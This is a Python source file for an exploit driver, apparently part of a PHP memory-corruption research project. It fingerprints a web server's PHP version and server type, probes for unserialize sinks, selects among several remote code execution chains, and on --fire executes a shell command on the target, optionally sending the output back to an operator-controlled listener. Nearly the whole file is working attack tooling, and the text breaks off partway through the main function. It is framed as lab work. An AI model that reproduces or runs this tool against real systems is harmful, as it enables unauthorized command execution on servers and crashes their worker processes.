#!/usr/bin/env python3
"""poc-php2shell-driver: the operator-facing CAPSTONE.

One tool that turns the project's settled map into an operator-usable exploit:
given a target URL (and, when known, the app endpoints that expose an
unserialize sink), it FINGERPRINTS the target, CLASSIFIES the sink(s) by
behaviour, SELECTS the lab-proven route from the settled decision table, and --
only on an explicit --fire -- RUNS the full chain and REPORTS delivery with
in-band or out-of-band evidence.

ASSEMBLY ONLY. This module defines no new primitive and makes no new claim. It
imports the already-proven route modules READ-ONLY and never re-implements or
edits them:

    fpm_offsets_fire          fpm comparison-sink leak -> table resolve ->
                              get_properties_for FIRE   (survivable, in-band)
    fpm_echo_route_driver     fpm echo-sink leak+fire    (one-shot, OOB verify)
    fpm_campaign           resolve-once / fire-many   (survivable multi-cmd)
    universal_remote_rce        Apache echo by-name RCE    (one-shot)
    sideeffect_exfil_apps     #6 comparison/branch-sink exfil + Http
    gadget_fingerprint        framework / gadget signal  (best-effort)
    oob_retrieve              out-of-band output channel (evidence)
    prefork_keepalive_fence   Apache pool-instability substrate

Every claim this driver prints traces to one of those modules' OWN verdicts; it
never prints a claim stronger than the underlying module proved (see DRIVER.md
for the decision-table -> source-module citations). Where a probe is ambiguous
(SAPI undetermined, sink tier not black-box determinable, version outside the
proven window), the driver SAYS SO AND STOPS -- it does not guess or default.

SAFETY / HOUSE RULES: default mode is DRY-RUN. The driver fingerprints, decides,
and prints the plan + evidence WITHOUT firing. Running a chain crashes workers
and executes a command on the target, so it needs an explicit --fire. Firing the
"no unserialize sink" config routes (fcgi autoprepend / include-race / filter
chain / pathinfo) is out of this driver's scope: it REPORTS the module to run.

Lab/analysis use only, on systems you own.

Usage:
    # decide only (safe), print the route + sink tiers + evidence plan:
    python3 -I poc/php2shell_driver.py --url http://127.0.0.1:8170/remote_app.php

    # declare the sink endpoints you know, then FIRE with OOB evidence:
    python3 -I poc/php2shell_driver.py --url http://127.0.0.1:8170/ \\
        --sort-path /order.php --dispatch-survivable /jsonapi.php \\
        --fire --cmd id --oob-host 192.168.32.1
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import re
import socket
import sys
import time
from urllib.parse import urlsplit

_POC = os.path.dirname(os.path.abspath(__file__))


# ===========================================================================
# READ-ONLY module loading (same pattern the route modules use among
# themselves: spec_from_file_location against poc/, nothing imported is edited)
# ===========================================================================
def _load(fname):
    path = os.path.join(_POC, fname)
    spec = importlib.util.spec_from_file_location(fname[:-3], path)
    mod = importlib.util.module_from_spec(spec)
    if _POC not in sys.path:
        sys.path.insert(0, _POC)
    spec.loader.exec_module(mod)
    return mod


# ===========================================================================
# tiny stdlib HTTP GET (headers + body). POSTs reuse sideeffect's Http.
# ===========================================================================
def _http_get(host, port, path, timeout=6.0):
    """Return (status:int, head:str, body:bytes). status 0 on transport error."""
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"User-Agent: p2s-driver\r\nConnection: close\r\n\r\n").encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    resp = b""
    try:
        s.connect((host, port))
        s.sendall(req)
        while True:
            c = s.recv(65536)
            if not c:
                break
            resp += c
    except OSError:
        return 0, "", b""
    finally:
        s.close()
    head, _, raw = resp.partition(b"\r\n\r\n")
    m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
    status = int(m.group(1)) if m else 0
    return status, head.decode("latin1", "replace"), raw


# ===========================================================================
# PHASE 1 -- recon & fingerprinting
# ===========================================================================
_VER_RE = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)", re.I)


def fingerprint_target(url, log):
    """Header/banner fingerprint. Returns a dict; never fires anything.

    Keys: host, port, base_path, status, server, powered_by, php_version
    (tuple|None), sapi ('fpm'|'apache'|None), gadget (best-effort framework
    signal dict)."""
    u = urlsplit(url if "://" in url else "http://" + url)
    host, port = u.hostname, u.port or 80
    base_path = u.path if (u.path and u.path != "/") else "/"
    fp = {"host": host, "port": port, "base_path": base_path,
          "server": "", "powered_by": "", "php_version": None, "sapi": None,
          "status": 0, "gadget": None}

    status, head, _ = _http_get(host, port, base_path)
    if status == 0:
        # retry against "/" in case the base path 404s the transport
        status, head, _ = _http_get(host, port, "/")
    fp["status"] = status
    sv = re.search(r"(?im)^server:\s*(.*?)\r?$", head)
    pw = re.search(r"(?im)^x-powered-by:\s*(.*?)\r?$", head)
    fp["server"] = sv.group(1).strip() if sv else ""
    fp["powered_by"] = pw.group(1).strip() if pw else ""

    vm = _VER_RE.search(fp["powered_by"]) or _VER_RE.search(fp["server"])
    if vm:
        fp["php_version"] = (int(vm.group(1)), int(vm.group(2)), int(vm.group(3)))

    srv = fp["server"].lower()
    if "apache" in srv:
        fp["sapi"] = "apache"
    elif "nginx" in srv or (fp["powered_by"] and "apache" not in srv):
        # nginx front, or an X-Powered-By PHP with no Apache banner -> fpm
        fp["sapi"] = "fpm"

    log(f"[fp] {host}:{port}{base_path}  HTTP {status}")
    log(f"[fp] Server: {fp['server'] or '(none)'}   "
        f"X-Powered-By: {fp['powered_by'] or '(none)'}")
    log(f"[fp] PHP version: "
        f"{'.'.join(map(str, fp['php_version'])) if fp['php_version'] else 'UNKNOWN'}"
        f"   SAPI: {fp['sapi'] or 'UNKNOWN'}")

    # best-effort framework / gadget signal (never fatal)
    try:
        gf = _load("primitives/tooling/gadget_fingerprint.py")
        fp["gadget"] = gf.fingerprint(host, port, lambda m: log("  " + m))
    except Exception as e:  # pragma: no cover - diagnostic only
        log(f"[fp] gadget fingerprint skipped ({e.__class__.__name__})")
    return fp


# --- sink classification ----------------------------------------------------
# A benign (no-object, no-UAF) serialized probe used to classify REFLECTING
# sinks by behaviour. Carries a recognisable integer marker.
_MARK = 1337
_BENIGN = ("a:1:{s:3:\"erd\";i:%d;}" % _MARK).encode()

ECHO_CANDIDATES = ["/remote_app.php", "/app.php", "/api.php", "/unserialize.php",
                   "/index.php"]
# get_object_vars / (array) / foreach / var_export / json-with-options:
# SURVIVABLE dispatch (null-checking get_properties_for path).
SURVIVABLE_DISPATCH_CANDIDATES = ["/jsonapi.php", "/normalize.php", "/profile.php"]
# serialize() / json_encode-direct default options: ONE-SHOT dispatch (null-wall).
ONESHOT_DISPATCH_CANDIDATES = ["/jsonfire.php", "/json.php"]


def _echo_probe(http, path):
    """True iff POSTing a benign serialized value to `path` reflects it back
    (serialize() echo sink). Returns ('echo'|None)."""
    st, _, body, _ = http.post(path, [(b"cook", _BENIGN)])
    if st == 200 and (b"i:%d" % _MARK) in body and b's:3:"erd"' in body:
        return "echo"
    return None


def classify_sinks(fp, declared, log):
    """Probe + classify every sink the driver can. `declared` carries operator
    overrides: echo_path, sort_path, gate_path, dispatch_survivable,
    dispatch_oneshot. Returns a dict:

        {'echo': path|None, 'sort': adapter|None, 'ordered': adapter|None,
         'equality': adapter|None, 'dispatch_survivable': path|None,
         'dispatch_oneshot': path|None, 'ambiguous': [msgs]}

    Behavioural detection is reliable for echo/sort/ordered/equality. A dispatch
    sink's TIER (survivable get_properties_for vs one-shot serialize/json-direct)
    is NOT black-box determinable, so the driver only records a dispatch tier
    the operator DECLARED, and flags any undeclared-but-responsive dispatch
    endpoint as ambiguous."""
    sx = _load("primitives/oracles/sideeffect_exfil_apps.py")
    http = sx.Http(fp["host"], fp["port"])
    out = {"echo": None, "sort": None, "ordered": None, "equality": None,
           "dispatch_survivable": None, "dispatch_oneshot": None,
           "ambiguous": [], "_http": http, "_sx": sx}

    # 1) comparison/branch sinks via the proven behavioural autodetect (#6).
    extra = []
    for key in ("sort_path", "gate_path"):
        if declared.get(key):
            extra.append(declared[key])
    if fp["base_path"].endswith(".php"):
        extra.append(fp["base_path"])
    sinks = sx.autodetect(http, extra_paths=tuple(extra),
                          log=lambda m: log("  " + m))
    out["sort"] = sinks.get("sort")
    out["ordered"] = sinks.get("ordered")
    out["equality"] = sinks.get("equality")

    # 2) echo-serialize sink (behavioural; benign probe).
    echo_paths = []
    if declared.get("echo_path"):
        echo_paths.append(declared["echo_path"])
    if fp["base_path"].endswith(".php"):
        echo_paths.append(fp["base_path"])
    echo_paths += ECHO_CANDIDATES
    seen = set()
    for p in echo_paths:
        if p in seen:
            continue
        seen.add(p)
        try:
            if _echo_probe(http, p) == "echo":
                out["echo"] = p
                log(f"[detect] {p:16s} -> echo     sink  (serialize() reflected; "
                    f"leak-capable + one-shot fire)")
                break
        except Exception:
            pass

    # 3) dispatch sinks: only trust an operator-DECLARED tier.
    if declared.get("dispatch_survivable"):
        out["dispatch_survivable"] = declared["dispatch_survivable"]
        log(f"[detect] {declared['dispatch_survivable']:16s} -> dispatch "
            f"(declared SURVIVABLE: null-checking get_properties_for)")
    if declared.get("dispatch_oneshot"):
        out["dispatch_oneshot"] = declared["dispatch_oneshot"]
        log(f"[detect] {declared['dispatch_oneshot']:16s} -> dispatch "
            f"(declared ONE-SHOT: serialize/json-direct, null-wall)")

    # Dispatch-tier is NOT behaviourally determinable black-box (a 200 on an
    # endpoint proves nothing about whether its get_properties_for path is
    # null-checking/survivable or serialize/json-direct/one-shot). The driver
    # therefore trusts ONLY an operator-declared dispatch tier -- it neither
    # guesses a tier nor stops on the mere presence of a 200 page. If no
    # dispatch is declared, the fpm route falls back to the echo sink (one-shot)
    # or exfil-only, both of which ARE behaviourally grounded.
    return out


# ===========================================================================
# PHASE 2 -- route selection (the settled decision table)
# ===========================================================================
class Ambiguous(Exception):
    """Raised when the driver must ask rather than guess (it stops, never
    defaults)."""


# Each route carries the source module's OWN verdict string (no stronger claim).
VERDICTS = {
    "fpm_offsets_fire":
        "fpm_offsets_fire (commit 2d9760f): leak+resolve over the comparison "
        "sink, FIRE via a get_properties_for dispatch path. Worker-SURVIVING, "
        "in-band; uid=33 5/5 in lab. "
        "cmd <=14B after the GC byte; exit0() auto-appends ';true'.",
    "fpm_echo_route":
        "fpm_echo_route_driver (commit f9d6d77): remote binbase leak + a7 UAF "
        "fire over ONE echo sink; uid=33 5/5, no /proc. ONE-SHOT: the serialize "
        "fire SIGSEGVs after system() returns (null-wall), so verify OUT OF "
        "BAND -- the HTTP response is not a success signal.",
    "remote_rce_campaign":
        "fpm_campaign (commit 76ef83f): resolve-once / fire-many over the ECHO "
        "sink. The RESOLVE (~352 req) is cached and reused across the worker "
        "respawn (binbase/chunk invariant: fork-shared ASLR); each cached shot is "
        "leak-primed (heap_leak+fire) and SIGSEGVs after system() returns. Verify "
        "each command OUT OF BAND (no in-band success signal).",
    "apache_remote_rce":
        "universal_remote_rce.run_chain (commit aa7e34e): Apache mod_php by-name "
        "offset-table-free a7 RCE; uid=33 on 8.5.x, unpinned scatter "
        "(a7-apache-port-verdict). ONE-SHOT: verify OUT OF BAND.",
    "exfil_only":
        "sideeffect_exfil_apps (commit 87e6035): recovers chunk+binbase over a "
        "comparison/branch sink with NO echo (WALL-1) -- no fire transport here "
        "without a dispatch or echo endpoint.",
    "config_routes":
        "no unserialize sink: config routes only (fcgi_autoprepend if a fpm "
        "socket is reachable; include-race; php filter-chain; pathinfo). This "
        "driver REPORTS them; fire them with their own modules + explicit flags.",
}


def _version_gate(fp, allow_81_83, log):
    """Enforce the settled version gates. Raises Ambiguous if the driver must
    ask. Returns the a7 'variant' string ('8.4'|'8.5')."""
    ver = fp["php_version"]
    if ver is None:
        raise Ambiguous(
            "PHP version is UNKNOWN (no PHP/x.y.z banner). The a7 variant (8.4 "
            "shim vs native 8.5) and the version gate both depend on it. "
            "Supply --php-version X.Y.Z (confirmed out of band) to proceed.")
    major, minor, patch = ver
    if (major, minor) < (8, 1):
        raise Ambiguous(f"PHP {major}.{minor}.{patch} is below the proven a7 "
                        f"window (8.1-8.5). No route is lab-proven here.")
    if (major, minor) in ((8, 1), (8, 2), (8, 3)) and not allow_81_83:
        raise Ambiguous(
            f"PHP {major}.{minor}.{patch}: the a7 chain is PRESENT on this line "
            f"but the offset-free auto-land is gated on the crash-tolerant R-6 "
            f"spray probe and the 8.2/8.3 table-route is pending the in-flight "
            f"offsets-table run. Re-run with --allow-81-83 to proceed anyway "
            f"(a7-cross-version-calibration).")
    variant = "8.5" if (major, minor) >= (8, 5) else "8.4"
    log(f"[gate] PHP {major}.{minor}.{patch} within proven window -> a7 "
        f"variant {variant}")
    return variant


def select_route(fp, sinks, want_multi, allow_81_83, log):
    """Map (fingerprint, sinks) to ONE proven route. Returns a decision dict.
    Raises Ambiguous when the driver must ask rather than guess."""
    sapi = fp["sapi"]
    if sapi is None:
        raise Ambiguous(
            "SAPI is UNDETERMINED (Server banner names neither Apache nor "
            "nginx, and X-Powered-By is absent). fpm and Apache take different "
            "routes. Supply --sapi fpm|apache to proceed.")

    variant = _version_gate(fp, allow_81_83, log)
    comparison = sinks["sort"] or sinks["ordered"]

    # ---- Apache ----
    if sapi == "apache":
        if sinks["echo"]:
            if variant != "8.5":
                log("[sel] NOTE: the committed Apache a7 by-name run_chain is "
                    "proven uid=33 on 8.5.x; on 8.1-8.4 R-2 scan_for_elf needs "
                    "the p_align fix -- treating as best-effort.")
            return {
                "route": "apache_remote_rce", "fire_mode": "one-shot",
                "module": "universal_remote_rce.run_chain",
                "sink": sinks["echo"], "variant": variant,
                "why": "Apache mod_php + echo sink -> a7 by-name RCE "
                       "(offset-table-free).",
                "verdict": VERDICTS["apache_remote_rce"],
                "evidence": "OOB (one-shot: HTTP response is not a signal)",
                "residual": ["per-fire ~1 request + 1 crash; unpinned scatter "
                             "across children (shared libphp base)",
                             "wrap in prefork_keepalive_fence if the pool is "
                             "unstable (--fence)"]}
        if comparison:
            return {"route": "exfil_only", "fire_mode": "none",
                    "module": "sideeffect_exfil_apps.run",
                    "sink": getattr(comparison, "path", None), "variant": variant,
                    "why": "Apache + comparison sink, no echo/dispatch -> "
                           "exfil-only (WALL-1).",
                    "verdict": VERDICTS["exfil_only"],
                    "evidence": "leaked chunk+binbase only (no fire)",
                    "residual": ["needs an echo or dispatch endpoint to fire"]}
        return _no_sink_decision(fp, variant)

    # ---- fpm ----
    # Best route: comparison leak + a SURVIVABLE dispatch fire (in-band, worker
    # survives). Needs BOTH a leak-capable comparison sink and a declared
    # survivable dispatch path.
    if comparison and sinks["dispatch_survivable"]:
        if want_multi:
            # multi-command over a survivable tier -> campaign (resolve-once).
            # NOTE: fpm_campaign resolves+fires over an ECHO sink; if only a
            # comparison+dispatch pair exists, campaign is not the matching
            # transport -> require an echo sink for --campaign.
            if not sinks["echo"]:
                raise Ambiguous(
                    "--campaign (resolve-once/fire-many) is driven by "
                    "fpm_campaign over an ECHO sink, but only a comparison+"
                    "dispatch pair was found. Declare the echo sink with "
                    "--echo-path, or drop --campaign to fire single commands "
                    "via fpm_offsets_fire.")
        return {
            "route": "fpm_offsets_fire", "fire_mode": "survivable",
            "module": "fpm_offsets_fire.run",
            "sink": getattr(comparison, "path", None),
            "fire_url_path": sinks["dispatch_survivable"], "variant": variant,
            "why": "fpm + comparison leak sink + SURVIVABLE dispatch -> "
                   "offset-table fire via get_properties_for (worker survives, "
                   "in-band).",
            "verdict": VERDICTS["fpm_offsets_fire"],
            "evidence": "command delivered (verify effect OUT OF BAND); the "
                        "worker pool stays alive (canary). The fire's HTTP-200 "
                        "'worker-surviving' signal (exit-0 cmd) is the module's "
                        "own metric, confirmed 5/5 by verify_offsets_fire_"
                        "jsonapi.py. NOTE: the LEAK phase respawns the worker "
                        "(a7 R: UAF; ASLR is fork-shared), so the worker PID "
                        "changes across the invocation -- that is the leak, not "
                        "the fire.",
            "residual": ["offset table is build-specific (fingerprinted by "
                         "&zval_ptr_dtor mod 2MiB AFTER the leak lands)",
                         "cmd <=14B after the GC byte"]}

    # Next: echo sink -> full leak+fire (one-shot).
    if sinks["echo"]:
        if want_multi:
            return {
                "route": "remote_rce_campaign", "fire_mode": "one-shot",
                "module": "fpm_campaign.run_campaign",
                "sink": sinks["echo"], "variant": variant,
                "why": "fpm + echo sink + multi-command -> resolve-once/"
                       "fire-many (RESOLVE cached across respawn; each fire is "
                       "one-shot and SIGSEGVs).",
                "verdict": VERDICTS["remote_rce_campaign"],
                "evidence": "OOB per command (each fire SIGSEGVs; no in-band "
                            "signal)",
                "residual": ["each cached shot is leak-primed; verify each "
                             "command OUT OF BAND", "cmd <=14B after GC byte"]}
        return {
            "route": "fpm_echo_route", "fire_mode": "one-shot",
            "module": "fpm_echo_route_driver.echo_route",
            "sink": sinks["echo"], "variant": variant,
            "why": "fpm + echo sink -> remote binbase leak + a7 UAF fire.",
            "verdict": VERDICTS["fpm_echo_route"],
            "evidence": "OOB (one-shot: HTTP response is not a signal)",
            "residual": ["the serialize fire SIGSEGVs after system() returns -- "
                         "verify OUT OF BAND", "cmd <=14B after the GC byte"]}

    # Comparison sink but no dispatch/echo -> exfil-only (WALL-1).
    if comparison:
        return {"route": "exfil_only", "fire_mode": "none",
                "module": "sideeffect_exfil_apps.run",
                "sink": getattr(comparison, "path", None), "variant": variant,
                "why": "fpm + comparison sink only (no echo, no declared "
                       "dispatch) -> exfil-only (WALL-1).",
                "verdict": VERDICTS["exfil_only"],
                "evidence": "leaked chunk+binbase only (no fire)",
                "residual": ["declare a dispatch path (--dispatch-survivable) "
                             "or an echo sink (--echo-path) to fire"]}

    return _no_sink_decision(fp, variant)


def _no_sink_decision(fp, variant):
    return {"route": "config_routes", "fire_mode": "none",
            "module": "(report only)", "sink": None, "variant": variant,
            "why": "no unserialize sink classified -> configuration routes.",
            "verdict": VERDICTS["config_routes"],
            "evidence": "n/a (not fired by this driver)",
            "residual": [
                "fcgi_autoprepend.py  -- if a php-fpm socket is reachable",
                "include_vectors.py / php_filter_chain.py -- include/LFI sinks",
                "scriptfilename_pathinfo.py -- PATH_INFO injection",
                "fire these with their own modules + explicit flags"]}


# ===========================================================================
# PHASE 3 -- execution & verification
# ===========================================================================
def _warn_cmd_budget(decision, base_cmd, oob_host, log):
    """One-shot sinks have a 14B cmd budget (after the GC byte). The OOB wrapper
    makes the command far longer than 14B, so OOB verification is incompatible
    with the one-shot 14B fire unless the command itself fits. Warn honestly."""
    if decision["fire_mode"] in ("one-shot", "survivable"):
        raw = base_cmd if isinstance(base_cmd, bytes) else base_cmd.encode()
        if oob_host and len(raw) > 0:
            log("[warn] the <=14B fire budget cannot carry the OOB curl wrapper "
                "in-line. For one-shot/survivable fires the proven pattern is a "
                "SHORT marker command (e.g. `id>/dev/shm/x`, already exit-0); "
                "OOB retrieval of large output needs the long-command "
                "finisher, out of this driver's assembly scope.")
        if len(raw) > 9 and b">" not in raw and b";true" not in raw:
            log(f"[warn] base command is {len(raw)}B; after the GC byte and a "
                f"possible ';true' exit-0 suffix it may exceed the 14B budget. "
                f"Prefer a redirecting marker (`cmd>file`, exits 0).")


def run_route(decision, fp, sinks, base_cmd, oob_host, oob_path, fire_retries,
              campaign_cmds, fence, spray_probe, log):
    """Execute the selected route. Returns a result dict with an honest
    'delivered'/'verified' split. Never conflates a worker-killing hit on a
    survivable sink with success."""
    host, port = fp["host"], fp["port"]
    result = {"route": decision["route"], "fire_mode": decision["fire_mode"],
              "delivered": False, "verified": None, "evidence": None,
              "detail": {}}

    # ---- OOB evidence channel (optional) ----
    oob = None
    oob_rt = None
    run_cmd = base_cmd
    if oob_host:
        oob_rt = _load("primitives/dispatch/oob_output.py")
        oob = oob_rt.OOBListener()
        cb = oob.url_for(oob_host, oob_path)
        run_cmd = oob_rt.wrap_command(
            base_cmd.decode() if isinstance(base_cmd, bytes) else base_cmd, cb)
        log(f"[oob] listener on {oob.host}:{oob.port}  callback {cb}")
        log(f"[oob] NOTE: the OOB wrapper is {len(run_cmd)}B -- usable only for "
            f"a fire mode without the 14B cap (not the a7 <=14B fire). For the "
            f"a7 fires below, OOB confirms egress only if a marker command fits.")

    pool = None
    if fence and fp["sapi"] == "apache":
        fencemod = _load("primitives/groom/keepalive_fence.py")
        pool = fencemod.PreforkFence(host, port,
                                     worker_count=fence if fence > 1 else 10)
        log(f"[fence] parking {pool.worker_count - 1} prefork children ...")
        pool.acquire()

    try:
        route = decision["route"]
        if route == "fpm_offsets_fire":
            fof = _load("chains/fpm_offsets_fire.py")
            sort_url = f"http://{host}:{port}{decision['sink']}"
            fire_url = f"http://{host}:{port}{decision['fire_url_path']}"
            cmd14 = fof.exit0(base_cmd)
            log(f"[run] fpm_offsets_fire: leak+resolve @ {decision['sink']} ; "
                f"fire @ {decision['fire_url_path']} ; cmd={cmd14!r} ; "
                f"spray={'probe' if spray_probe else 'table-const (proven 5/5)'}")
            rc = fof.run(sort_url, cmd=cmd14, fire_url=fire_url,
                         probe_spray=spray_probe, log=log)
            result["delivered"] = (rc == 0)
            result["detail"]["return_code"] = rc

        elif route == "fpm_echo_route":
            erd = _load("chains/fpm_echo_route_driver.py")
            path = decision["sink"]
            log(f"[run] fpm_echo_route_driver.echo_route @ {path} "
                f"variant={decision['variant']}")
            r = erd.echo_route(host, port, path,
                               base_cmd.decode() if isinstance(base_cmd, bytes)
                               else base_cmd,
                               variant=decision["variant"], verbose=True)
            result["delivered"] = bool(r.get("ok")) or r.get("stage") == "fire"
            result["detail"] = {k: r.get(k) for k in
                                ("binbase", "chunk", "leak_reqs", "rce_reqs",
                                 "rce_crashes", "stage", "error")}

        elif route == "remote_rce_campaign":
            camp = _load("chains/fpm_campaign.py")
            path = decision["sink"]
            cmds = campaign_cmds or [base_cmd.decode() if isinstance(base_cmd, bytes)
                                     else base_cmd]
            log(f"[run] fpm_campaign.run_campaign @ {path} "
                f"({len(cmds)} cmd(s)) variant={decision['variant']}")
            info = camp.run_campaign(host, port, path, cmds,
                                     variant=decision["variant"],
                                     fire_retries=fire_retries, verbose=True)
            result["delivered"] = (info.get("spray_addr") is not None
                                   and info.get("delivered", 0) >= 1)
            result["detail"] = {k: info.get(k) for k in
                                ("binbase", "chunk", "system", "delivered",
                                 "campaign_est_reqs", "resolve_reqs", "stage",
                                 "error")}

        elif route == "apache_remote_rce":
            remote_rce = _load("chains/universal_remote_rce.py")
            path = decision["sink"]
            # Apache mod_php is prefork: the fire scatters across children
            # (shared libphp base, no pinning), so deliver a few passes. Each
            # run_chain is the proven single-shot; the OOB marker is the oracle.
            attempts = max(1, fire_retries)
            log(f"[run] universal_remote_rce.run_chain @ {path} x{attempts} "
                f"(prefork scatter; verify the marker OUT OF BAND)")
            ok = False
            for i in range(attempts):
                if remote_rce.run_chain(host, port, path=path, cmd=base_cmd):
                    ok = True
                log(f"  pass {i + 1}/{attempts} delivered")
            result["delivered"] = bool(ok)

        elif route == "exfil_only":
            sx = sinks["_sx"]
            url = f"http://{host}:{port}{decision['sink']}"
            log(f"[run] sideeffect_exfil_apps.run @ {decision['sink']} "
                f"(exfil-only, no fire)")
            rc = sx.run(url, log=log)
            result["delivered"] = (rc == 0)
            result["detail"]["return_code"] = rc

        else:  # config_routes -- report only
            log("[run] no-sink target: report-only (config routes). Nothing "
                "fired by this driver.")
            result["delivered"] = False
            result["verified"] = None
            return result

        # ---- success oracle (priority: in-band -> OOB -> crash-liveness) ----
        # Only score a fire that was actually delivered; a module failure
        # (R-6 miss, leak fail) is NOT a verifiable hit, and the worker-alive
        # canary alone must never be read as success.
        if result["delivered"]:
            result["verified"], result["evidence"] = _verify(
                decision, fp, sinks, oob, run_cmd, base_cmd, log)
        else:
            result["verified"] = False
            result["evidence"] = ("fire NOT delivered (see detail: return code "
                                  "/ stage / error) -- not a hit")
    finally:
        if oob is not None:
            oob.close()
        if pool is not None:
            pool.close()
    return result


def _worker_alive(fp, sinks, log):
    """Benign liveness canary on a detected sink (fpm single worker: a dead
    worker would have respawned, but a benign probe that still classifies the
    sink shows the SAPI is serving). Returns True/False/None(no canary)."""
    http = sinks.get("_http")
    for key in ("sort", "ordered"):
        ad = sinks.get(key)
        if ad is not None:
            try:
                return bool(ad.detect())
            except Exception:
                return False
    if sinks.get("echo") and http is not None:
        try:
            return _echo_probe(http, sinks["echo"]) == "echo"
        except Exception:
            return False
    return None


def _verify(decision, fp, sinks, oob, run_cmd, base_cmd, log):
    """Return (verified:bool|None, evidence:str). Honest tiering: a worker-
    killing hit on a SURVIVABLE sink is a FAILED fire by house definition."""
    mode = decision["fire_mode"]
    if mode == "none":
        return None, "no fire for this route"

    # 1) OOB marker (works regardless of tier IF the wrapped command ran).
    if oob is not None:
        body = oob.wait(timeout=8.0)
        if body:
            txt = body.decode("utf-8", "replace").strip()
            log(f"[verify] OOB callback received: {txt[:200]!r}")
            return True, f"OOB: {txt[:200]}"
        log("[verify] no OOB callback (the <=14B a7 fire cannot carry the curl "
            "wrapper; OOB applies to a non-capped fire only).")

    # 2) survivable tier: confirm the pool still SERVES after the fire (benign
    #    canary). This is the pool-alive signal, NOT a PID check -- the leak
    #    phase respawns the worker regardless (a7 R: UAF; ASLR fork-shared), so
    #    PID is expected to change. The module's own HTTP-200 survival metric
    #    (exit-0 fire returns 200, not 502) is verified by
    #    verify_offsets_fire_jsonapi.py (5/5); it is not observable through run().
    if mode == "survivable":
        alive = _worker_alive(fp, sinks, log)
        if alive is True:
            log("[verify] pool still serving after the fire (benign sink "
                "canary). Verify the command's effect OUT OF BAND (dispatch "
                "sinks echo no output).")
            return True, ("pool-alive canary (verify the command's effect OUT "
                          "OF BAND; HTTP-200 worker-survival is the module's "
                          "verify_offsets_fire_jsonapi.py metric)")
        if alive is False:
            log("[verify] pool NOT serving the sink after the fire -- the "
                "exploit took the pool down (not a clean survivable fire).")
            return False, "pool not serving after fire = failed"
        return None, "delivered; no liveness canary available"

    # 3) one-shot tier: the fire SIGSEGVs by design; only OOB can confirm effect.
    log("[verify] one-shot tier: the fire SIGSEGVs after system() returns, so "
        "the HTTP response is NOT a success signal. Verify the command's effect "
        "OUT OF BAND (a marker file / callback).")
    return None, "one-shot fire delivered; confirm effect OUT OF BAND"


# ===========================================================================
# Report
# ===========================================================================
def print_decision(decision, log):
    log("=" * 72)
    log(f"ROUTE        : {decision['route']}  ({decision['module']})")
    log(f"FIRE MODE    : {decision['fire_mode']}")
    log(f"SINK         : {decision.get('sink')}"
        + (f"   FIRE-VIA: {decision['fire_url_path']}"
           if decision.get("fire_url_path") else ""))
    log(f"WHY          : {decision['why']}")
    log(f"EVIDENCE PLAN: {decision['evidence']}")
    log(f"SOURCE/VERDICT: {decision['verdict']}")
    if decision.get("residual"):
        log("RESIDUAL RISK:")
        for r in decision["residual"]:
            log(f"   - {r}")
    log("=" * 72)


# ===========================================================================
# CLI
# ===========================================================================
def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True,
                    help="target URL (optionally a specific .php sink path)")
    ap.add_argument("--fire", action="store_true",
                    help="RUN the selected chain (default: dry-run decide only). "
                         "Firing crashes workers and executes --cmd on the target.")
    ap.add_argument("--cmd", default="id>/dev/shm/x",
                    help="command to run (<=14B after the GC byte for a7 fires; "
                         "a `cmd>file` redirect already exits 0)")
    ap.add_argument("--campaign", type=int, default=0, metavar="N",
                    help="resolve-once/fire-many: fire N commands (survivable "
                         "tier). With one --cmd it is repeated N times.")
    ap.add_argument("--cmd-list", action="append", default=None,
                    help="explicit campaign command (repeatable); overrides the "
                         "repeat-N behaviour")
    ap.add_argument("--fire-retries", type=int, default=3,
                    help="leak-primed fires per cached campaign command")
    ap.add_argument("--spray-probe", action="store_true",
                    help="fpm_offsets_fire: use the bounded R-6 length-probe for "
                         "the spray slot instead of the build-table const. The "
                         "proven 5/5 path uses the table const (default off); the "
                         "probe is for a shape where the const is miscalibrated.")
    # sink declarations (operator knowledge; the driver auto-detects the rest)
    ap.add_argument("--echo-path", help="echo (serialize-reflecting) sink path")
    ap.add_argument("--sort-path", help="sort/ORDER-BY comparison sink path")
    ap.add_argument("--gate-path", help="ordered access-gate sink path")
    ap.add_argument("--dispatch-survivable",
                    help="declared SURVIVABLE dispatch path (get_object_vars/"
                         "(array)/foreach/var_export/json-with-options)")
    ap.add_argument("--dispatch-oneshot",
                    help="declared ONE-SHOT dispatch path (serialize/json-direct)")
    # fingerprint overrides (used only when a probe is ambiguous)
    ap.add_argument("--sapi", choices=["fpm", "apache"],
                    help="override SAPI when the banner is inconclusive")
    ap.add_argument("--php-version", help="override PHP version X.Y.Z when the "
                                          "banner is absent")
    ap.add_argument("--allow-81-83", action="store_true",
                    help="permit the 8.1-8.3 a7 routes (gated pending the "
                         "offsets-table run)")
    # evidence / reliability
    ap.add_argument("--oob-host", help="how the TARGET reaches this host's OOB "
                                       "listener (e.g. the docker bridge gateway)")
    ap.add_argument("--oob-path", default="/", help="OOB callback path")
    ap.add_argument("--fence", type=int, default=0, metavar="WORKERS",
                    help="Apache only: wrap the chain in a prefork keep-alive "
                         "fence of WORKERS children (pool-instability substrate)")
    args = ap.parse_args(argv)

    log = print
    log("php2shell driver -- assembly of proven routes (lab/analysis use only)")
    log("mode: " + ("FIRE" if args.fire else "DRY-RUN (decide only)"))

    # ---- Phase 1: fingerprint ----
    fp = fingerprint_target(args.url, log)
    if args.sapi:
        fp["sapi"] = args.sapi
        log(f"[fp] SAPI overridden -> {args.sapi}")
    if args.php_version:
        try:
            fp["php_version"] = tuple(int(x) for x in args.php_version.split("."))
            log(f"[fp] PHP version overridden -> {args.php_version}")
        except ValueError:
            log("[fatal] --php-version must be X.Y.Z")
            return 2

    declared = {"echo_path": args.echo_path, "sort_path": args.sort_path,
                "gate_path": args.gate_path,
                "dispatch_survivable": args.dispatch_survivable,
                "dispatch_oneshot": args.dispatch_oneshot}

    # ---- sink classification ----
    log("-" * 72)
    log("[detect] classifying sinks ...")
    sinks = classify_sinks(fp, declared, log)

    # ---- Phase 2: route selection ----
    want_multi = args.campaign > 0 or bool(args.cmd_list)
    try:
